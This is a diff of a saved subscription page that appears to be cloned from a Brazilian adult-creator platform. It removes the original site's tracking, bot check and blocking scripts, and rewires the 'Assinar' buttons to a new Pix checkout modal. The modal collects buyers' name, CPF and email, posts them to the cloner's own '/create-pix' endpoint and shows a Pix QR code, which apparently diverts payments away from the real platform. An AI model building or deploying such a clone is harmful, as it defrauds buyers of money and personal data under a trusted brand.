@@ -1,36 +1,4 @@
 <!DOCTYPE html><html class="v10" data-theme-lock="true"><head>
-    <!-- Scripts de rastreamento desativados para ambiente local
-    <script async="" src="js/gtm.js"></script><script async="" src="js/datadog-rum.js"></script><script>
-  (function(h,o,u,n,d) {
-    h=h[d]=h[d]||{q:[],onReady:function(c){h.q.push(c)}}
-    d=o.createElement(u);d.async=1;d.src=n
-    n=o.getElementsByTagName(u)[0];n.parentNode.insertBefore(d,n)
-  })(window,document,'script','https://www.datadoghq-browser-agent.com/us1/v5/datadog-rum.js','DD_RUM')
-
-  window.DD_RUM.onReady(function() {
-    window.DD_RUM.init({
-      applicationId: '87c02dad-5232-4003-8ba2-189ebb022826',
-      clientToken: 'pubd5d0ca2a8453163cbfba02b9d3093ef5',
-      site: 'datadoghq.com',
-      service: 'web-legacy-production',
-      env: 'production',
-      version: '20260128122925',
-      sessionSampleRate: 100,
-      sessionReplaySampleRate: 100,
-      trackUserInteractions: true,
-      trackResources: true,
-      trackLongTasks: true,
-      defaultPrivacyLevel: 'mask-user-input'
-      ,shadowDomConfiguration: {
-        allowedStyleSheetUrls: [window.location.origin]
-      }
-    });
-
-    window.DD_RUM.startSessionReplayRecording();
-  });
-</script>
--->
-
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta http-equiv="x-ua-compatible" content="ie=edge">
@@ -276,23 +244,11 @@
 
 
     <script src="js/jquery.min.js" crossorigin="anonymous"></script>
-    
-
-
-<script src="js/vue.global.prod.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="js/vue-i18n.global.prod.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-
-<script src="js/lodash.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="js/index.full.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="js/pt-br.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="js/es.min_1.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="js/axios.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="js/moment.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="js/pt-br.min_1.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="js/es.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script src="js/index.min.js"></script>
-
-<script src="js/privacy-web-wc-loader.umd.js"></script>
+    <script src="js/vue.global.prod.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="js/lodash.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="js/axios.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="js/moment.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="js/pt-br.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
 <script>
     window.WC_AUTO_LOADER.version = '20260128122925'
 </script>
@@ -631,9 +587,24 @@
                 </div>
             </div>
 
+        <!-- Main Subscription Button -->
+        <div class="offer-card mx-3 p-3 mb-4">
+            <div class="offer-header d-flex align-items-center mb-1">
+                <span class="offer-sparkle">✨</span>
+                <span class="offer-title">Oferta de assinatura</span>
+            </div>
+            <p class="offer-countdown" id="countdown-timer">Termina em 1 dia, 6h 17m 18s</p>
+            
+            <div class="creator-message-row d-flex align-items-center mb-4">
+                <img src="images/eyJidWNrZXQiOiJzZXJ2ZXJsZXNzaW1hZ2VoYW5kbGVyc291cmNlcHJpdmFjeSIsImtleSI6IjIwMjUtMTEtNS81ODRiZTAyNS05NTRjLTRmMjItYTQzNS01YmI1NmQ1MWUxMGMtNjM4OTc5NDY3NDk2MDQ0NDU1LmpwZWcifQ==.jpg" class="creator-mini-avatar" alt="Nicole Lux">
+                <div class="message-bubble">
+                    Vem começar o ano daquele jeitinho gostoso amor 🥵🔥
+                </div>
+            </div>
+
             <div class="main-subscription-button-wrapper position-relative">
                 <span class="discount-badge">Economize 20%</span>
-                <button class="btn btn-subscribe-main w-100 py-3">
+                <button class="btn btn-subscribe-main w-100 py-3 open-pix-modal" data-price="19,99" data-plan="Mensal">
                     Assinar agora R$ 19,99
                 </button>
             </div>
@@ -648,11 +619,11 @@
                 <span class="subscriptions-title">Assinaturas</span>
                 <i class="fas fa-chevron-up" style="color: #999; font-size: 14px;"></i>
             </div>
-            <button class="btn btn-subscription-alt w-100 mb-2 d-flex justify-content-between align-items-center px-4">
+            <button class="btn btn-subscription-alt w-100 mb-2 d-flex justify-content-between align-items-center px-4 open-pix-modal" data-price="52,48" data-plan="3 meses">
                 <span class="sub-text">3 meses (30% off )</span>
                 <span class="sub-price">R$ 52,48</span>
             </button>
-            <button class="btn btn-subscription-alt w-100 mb-2 d-flex justify-content-between align-items-center px-4">
+            <button class="btn btn-subscription-alt w-100 mb-2 d-flex justify-content-between align-items-center px-4 open-pix-modal" data-price="89,96" data-plan="6 meses">
                 <span class="sub-text">6 meses (40% off )</span>
                 <span class="sub-price">R$ 89,96</span>
             </button>
@@ -1236,7 +1207,381 @@
         background: currentColor;
         border-radius: 50%;
     }
+
+    /* Pix Modal Styles */
+    .pix-modal-overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.5);
+        display: none;
+        align-items: flex-end; /* Mobile style, slide from bottom */
+        justify-content: center;
+        z-index: 9999;
+    }
+
+    .pix-modal-container {
+        background: #fff;
+        width: 100%;
+        max-width: 500px;
+        border-radius: 20px 20px 0 0;
+        padding: 20px;
+        animation: slideUp 0.3s ease-out;
+    }
+
+    @keyframes slideUp {
+        from { transform: translateY(100%); }
+        to { transform: translateY(0); }
+    }
+
+    .pix-modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+    }
+
+    .pix-modal-title {
+        font-weight: 700;
+        font-size: 18px;
+    }
+
+    .pix-close-btn {
+        font-size: 24px;
+        color: #999;
+        cursor: pointer;
+    }
+
+    .pix-info-row {
+        background: #f8f8f8;
+        border-radius: 12px;
+        padding: 15px;
+        margin-bottom: 20px;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+    }
+
+    .pix-label {
+        font-size: 14px;
+        color: #666;
+    }
+
+    .pix-value {
+        font-weight: 700;
+        font-size: 16px;
+    }
+
+    .pix-method-select {
+        border: 2px solid #fe754f;
+        border-radius: 12px;
+        padding: 15px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        margin-bottom: 25px;
+        position: relative;
+    }
+
+    .pix-method-icon {
+        width: 40px;
+        height: 40px;
+        background: #e6f7f5;
+        border-radius: 8px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #32bcad;
+        font-weight: 700;
+        font-size: 18px;
+    }
+
+    .pix-method-text {
+        flex: 1;
+    }
+
+    .pix-method-name {
+        font-weight: 700;
+        font-size: 15px;
+        margin: 0;
+    }
+
+    .pix-method-desc {
+        font-size: 12px;
+        color: #666;
+        margin: 0;
+    }
+
+    .pix-check-icon {
+        color: #fe754f;
+        font-size: 20px;
+    }
+
+    .btn-pix-confirm {
+        background: var(--color-privacy-gradient);
+        color: #fff;
+        border: none;
+        border-radius: 25px;
+        width: 100%;
+        padding: 15px;
+        font-weight: 700;
+        font-size: 16px;
+        box-shadow: 0 4px 12px rgba(254, 117, 79, 0.3);
+    }
+
+    .pix-footer-text {
+        text-align: center;
+        font-size: 12px;
+        color: #999;
+        margin-top: 15px;
+    }
+
+    /* Checkout Form Styles */
+    .pix-form-group {
+        margin-bottom: 15px;
+    }
+    .pix-form-group label {
+        display: block;
+        font-size: 13px;
+        font-weight: 600;
+        margin-bottom: 5px;
+        color: #444;
+    }
+    .pix-form-input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ddd;
+        border-radius: 10px;
+        font-size: 14px;
+        outline: none;
+    }
+    .pix-form-input:focus {
+        border-color: #fe754f;
+    }
+    
+    /* QR Code Styles */
+    #pixQrContainer {
+        text-align: center;
+        display: none;
+    }
+    .qr-image {
+        width: 200px;
+        height: 200px;
+        margin: 0 auto 15px;
+        border: 1px solid #eee;
+        padding: 10px;
+        border-radius: 10px;
+    }
+    .copy-paste-box {
+        background: #f1f1f1;
+        padding: 10px;
+        border-radius: 8px;
+        font-family: monospace;
+        font-size: 12px;
+        word-break: break-all;
+        margin-bottom: 10px;
+        border: 1px dashed #ccc;
+        max-height: 60px;
+        overflow: hidden;
+    }
+    .btn-copy {
+        background: #eee;
+        border: 1px solid #ddd;
+        padding: 8px 15px;
+        border-radius: 5px;
+        font-size: 13px;
+        font-weight: 600;
+        cursor: pointer;
+        width: 100%;
+        margin-bottom: 10px;
+    }
+    .btn-copy:active {
+        background: #e0e0e0;
+    }
 </style>
+
+    </div>
+</div>
+
+<!-- Pix Modal -->
+<div class="pix-modal-overlay" id="pixModal">
+    <div class="pix-modal-container">
+        <div class="pix-modal-header">
+            <span class="pix-modal-title">Pagamento</span>
+            <span class="pix-close-btn" id="closePixModal">&times;</span>
+        </div>
+        
+        <div class="pix-info-row">
+            <span class="pix-label">Plano <span id="pixPlanName">Mensal</span></span>
+            <span class="pix-value">R$ <span id="pixPlanPrice">19,99</span></span>
+        </div>
+
+        <div id="pixStep1">
+            <p style="font-size: 14px; font-weight: 700; margin-bottom: 15px;">Dados do Pagador</p>
+            
+            <div class="pix-form-group">
+                <label>Nome Completo</label>
+                <input type="text" id="debtor_name" class="pix-form-input" placeholder="Seu nome">
+            </div>
+            
+            <div class="pix-form-group">
+                <label>CPF</label>
+                <input type="text" id="debtor_document" class="pix-form-input" placeholder="000.000.000-00">
+            </div>
+            
+            <div class="pix-form-group">
+                <label>E-mail</label>
+                <input type="email" id="debtor_email" class="pix-form-input" placeholder="seu@email.com">
+            </div>
+
+            <div class="pix-method-select">
+                <div class="pix-method-icon">
+                    <svg viewBox="0 0 512 512" width="24" fill="#32bcad"><path d="M242.4 292.5C247.8 287.1 256.2 287.1 261.6 292.5L340.5 371.4C345.9 376.8 345.9 385.2 340.5 390.6L261.6 469.5C256.2 474.9 247.8 474.9 242.4 469.5L163.5 390.6C158.1 385.2 158.1 376.8 163.5 371.4L242.4 292.5zM261.6 219.5C256.2 224.9 247.8 224.9 242.4 219.5L163.5 140.6C158.1 135.2 158.1 126.8 163.5 121.4L242.4 42.5C247.8 37.1 256.2 37.1 261.6 42.5L340.5 121.4C345.9 126.8 345.9 135.2 340.5 140.6L261.6 219.5zM469.5 242.4C474.9 247.8 474.9 256.2 469.5 261.6L390.6 340.5C385.2 345.9 376.8 345.9 371.4 340.5L292.5 261.6C287.1 256.2 287.1 247.8 292.5 242.4L371.4 163.5C376.8 158.1 385.2 158.1 390.6 163.5L469.5 242.4zM121.4 261.6C116 256.2 116 247.8 121.4 242.4L200.3 163.5C205.7 158.1 214.1 158.1 219.5 163.5L298.4 242.4C303.8 247.8 303.8 256.2 298.4 261.6L219.5 340.5C214.1 345.9 205.7 345.9 200.3 340.5L121.4 261.6z"/></svg>
+                </div>
+                <div class="pix-method-text">
+                    <p class="pix-method-name">Pix</p>
+                    <p class="pix-method-desc">Aprovação imediata</p>
+                </div>
+                <i class="fas fa-check-circle pix-check-icon"></i>
+            </div>
+
+            <button class="btn-pix-confirm" id="confirmPix">Gerar QR Code Pix</button>
+        </div>
+
+        <div id="pixQrContainer">
+            <p style="font-size: 14px; font-weight: 700; margin-bottom: 15px;">Escaneie o QR Code</p>
+            <img src="" id="pixQrImage" class="qr-image">
+            <div class="copy-paste-box" id="pixCopyPaste"></div>
+            <button class="btn-copy" id="btnCopyPix">Copiar Código Pix</button>
+            <p style="font-size: 12px; color: #666;">Aguardando pagamento...</p>
+        </div>
+        
+        <p class="pix-footer-text">Ambiente seguro 🔒</p>
+    </div>
+</div>
+
+<script>
+    $(document).ready(function() {
+        // Modal Logic
+        const modal = $('#pixModal');
+        const closeBtn = $('#closePixModal');
+        const pixStep1 = $('#pixStep1');
+        const pixQrContainer = $('#pixQrContainer');
+
+        $('.open-pix-modal').on('click', function() {
+            const price = $(this).data('price');
+            const plan = $(this).data('plan');
+            
+            $('#pixPlanName').text(plan);
+            $('#pixPlanPrice').text(price);
+            
+            // Reset to step 1
+            pixStep1.show();
+            pixQrContainer.hide();
+            $('#confirmPix').text('Gerar QR Code Pix').prop('disabled', false);
+
+            modal.css('display', 'flex');
+        });
+
+        closeBtn.on('click', function() {
+            modal.hide();
+        });
+
+        $(window).on('click', function(event) {
+            if (event.target == modal[0]) {
+                modal.hide();
+            }
+        });
+
+        $('#confirmPix').on('click', async function() {
+            const name = $('#debtor_name').val();
+            const cpf = $('#debtor_document').val();
+            const email = $('#debtor_email').val();
+            const amountStr = $('#pixPlanPrice').text().replace(',', '.');
+            const amount = parseFloat(amountStr);
+
+            if (!name || !cpf || !email) {
+                alert('Por favor, preencha todos os campos.');
+                return;
+            }
+
+            const btn = $(this);
+            btn.html('<i class="fas fa-spinner fa-spin"></i> Gerando...').prop('disabled', true);
+
+            try {
+                // Chamada para o nosso backend
+                const response = await fetch('/create-pix', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        amount: amount,
+                        debtor_name: name,
+                        email: email,
+                        debtor_document_number: cpf
+                    })
+                });
+                
+                const data = await response.json();
+
+                if (data.idTransaction && data.qrcode) {
+                    $('#pixQrImage').attr('src', data.qr_code_image_url);
+                    $('#pixCopyPaste').text(data.qrcode);
+                    
+                    pixStep1.hide();
+                    pixQrContainer.show();
+
+                    // Inicia o Polling para verificar se foi pago
+                    startPolling(data.idTransaction);
+                } else {
+                    throw new Error(data.message || 'Erro ao gerar transação');
+                }
+
+            } catch (error) {
+                console.error('Erro na integração:', error);
+                alert('Erro ao gerar PIX: ' + error.message);
+                btn.text('Gerar QR Code Pix').prop('disabled', false);
+            }
+        });
+
+        function startPolling(transactionId) {
+            const pollInterval = setInterval(async () => {
+                try {
+                    const res = await fetch(`/check-status/${transactionId}`);
+                    const statusData = await res.json();
+
+                    if (statusData.approved) {
+                        clearInterval(pollInterval);
+                        
+                        // Mensagem de Sucesso
+                        pixQrContainer.html(`
+                            <div style="text-align: center; padding: 20px;">
+                                <i class="fas fa-check-circle" style="font-size: 48px; color: #32bcad; margin-bottom: 15px;"></i>
+                                <h3 style="margin-bottom: 10px;">Compra realizada!</h3>
+                                <p style="color: #666;">Pagamento aprovado. O conteúdo foi liberado.</p>
+                                <button class="btn-pix-confirm" onclick="location.reload()" style="margin-top: 20px;">Acessar Conteúdo</button>
+                            </div>
+                        `);
+                    }
+                } catch (e) {
+                    console.error('Erro no polling:', e);
+                }
+            }, 3000); // Verifica a cada 3 segundos
+        }
+
+        $('#btnCopyPix').on('click', function() {
+            const code = $('#pixCopyPaste').text();
+            navigator.clipboard.writeText(code).then(() => {
+                const originalText = $(this).text();
+                $(this).text('Copiado!');
+                setTimeout(() => $(this).text(originalText), 2000);
+            });
+        });
+    });
+</script>
 
 <div style="display:none">
     <div id="wc-content-user-info">
@@ -1571,13 +1916,7 @@
     <script src="js/global.js" defer=""></script>
     <script src="js/sweetalert.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script src="js/bootstrap.min.js" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-    <script src="js/appleid.auth.js" defer=""></script>
     <script src="js/themeManager.js" defer=""></script>
-    <script src="js/paymentTracking.js" defer=""></script>
-    <!-- Desativado localmente
-    <script src="js/gtmManager.js" async=""></script>
-    <script src="js/clarity.js" async=""></script>
-    -->
 
     
 <script>
@@ -1654,16 +1993,4 @@
     
 </script>
     
-    <script src="js/turnstile.js"></script>
-
-
-
-
-    
-        <script src="js/bloqueio.js"></script>
-    
-
-    
-
-
-</body></html>
+    </body></html>
